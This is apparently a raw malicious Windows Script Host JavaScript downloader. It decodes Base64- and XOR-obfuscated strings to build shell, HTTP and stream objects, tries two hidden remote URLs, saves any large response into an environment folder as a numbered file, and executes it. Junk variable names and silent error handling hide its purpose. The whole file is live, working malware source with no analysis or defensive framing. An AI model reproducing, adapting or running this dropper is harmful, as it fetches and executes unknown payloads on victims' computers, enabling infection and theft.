var decode = function (packedText) {
    var cipher ="yG8Qo4UEJBwoU6d4";

    var Base64 = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

        decode: function (input) {
            var output = "";
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            while (i < input.length) {

                enc1 = this._keyStr.indexOf(input.charAt(i++));
                enc2 = this._keyStr.indexOf(input.charAt(i++));
                enc3 = this._keyStr.indexOf(input.charAt(i++));
                enc4 = this._keyStr.indexOf(input.charAt(i++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                output = output + String.fromCharCode(chr1);

                if (enc3 != 64) {
                    output = output + String.fromCharCode(chr2);
                }
                if (enc4 != 64) {
                    output = output + String.fromCharCode(chr3);
                }

            }

            output = Base64._utf8_decode(output);

            return output;

        },
        _utf8_decode: function (utftext) {
            var string = "";
            var i = 0;
            var c = c1 = c2 = 0;

            while (i < utftext.length) {

                c = utftext.charCodeAt(i);

                if (c < 128) {
                    string += String.fromCharCode(c);
                    i++;
                }
                else if ((c > 191) && (c < 224)) {
                    c2 = utftext.charCodeAt(i + 1);
                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    i += 2;
                }
                else {
                    c2 = utftext.charCodeAt(i + 1);
                    c3 = utftext.charCodeAt(i + 2);
                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    i += 3;
                }

            }
            return string;
        }
    };

    var text = Base64.decode(packedText);

    var cipherLength = cipher.length;
    var result = "";
    for (var i = 0; i < text.length; i++) {
        result += String.fromCharCode(text.charCodeAt(i) ^ cipher.charCodeAt(i % cipherLength));
    }
    return result;
};
(function() {
    var factiousiF8 = 200;
    var amicabletd5 = decode('"PgJs"');
    var passetIm = decode('"PD9dMg=="');
    var propertyEVS = decode('"LhRbIwZEIWsZKhIDOQ=="');
    var egregiouszOb = decode('"NBRgHCMGex0HDj87AWY="');
    var audaciouso5Z = decode('"OAN3FS0="');
    var mountebankEfC = decode('"KjNKNA5Z"');
    var besiegehkv = decode('"XBN9HD8RCQ=="');
    var nexusLXb = decode('"VyJANA=="');
    var flairdNc = 2e5;
    var fructifyVkD = [ decode('"ETNMIVUbei0vLhsAIlkWWB02SSBBVzooZXpHQTBOAQ=="'), decode('"ETNMIVUbejI+JB4cMlkNWh4vXSMKUjNrKS0aQG0GSlEBIg=="') ];
    var canonjNl = 524288;
    var pallidhHZ = WScript.CreateObject(propertyEVS);
    var attitudeDPc = WScript.CreateObject(egregiouszOb);
    var tutelagenzc = WScript.CreateObject(audaciouso5Z + decode('"Vw=="') + mountebankEfC);
    var concomitantohz = pallidhHZ.ExpandEnvironmentStrings(besiegehkv);
    var hurtledaJ = concomitantohz + canonjNl + nexusLXb;
    var consecrategfw = false;
    for (var projectionzY9 = 0; projectionzY9 < fructifyVkD.length; projectionzY9++) {
        try {
            var vacatePK4 = fructifyVkD[projectionzY9];
            attitudeDPc.open(amicabletd5, vacatePK4, false);
            attitudeDPc.send();
            if (attitudeDPc.status == factiousiF8) {
                try {
                    tutelagenzc.open();
                    tutelagenzc.type = 1;
                    tutelagenzc.write(attitudeDPc.responseBody);
                    if (tutelagenzc.size > flairdNc) {
                        projectionzY9 = fructifyVkD.length;
                        tutelagenzc.position = 0;
                        tutelagenzc.saveToFile(hurtledaJ, 2);
                        consecrategfw = true;
                    }
                } finally {
                    tutelagenzc.close();
                }
            }
        } catch (ignored) {}
    }
    if (consecrategfw) {
        pallidhHZ[passetIm](concomitantohz + Math.pow(2, 19));
    }
})();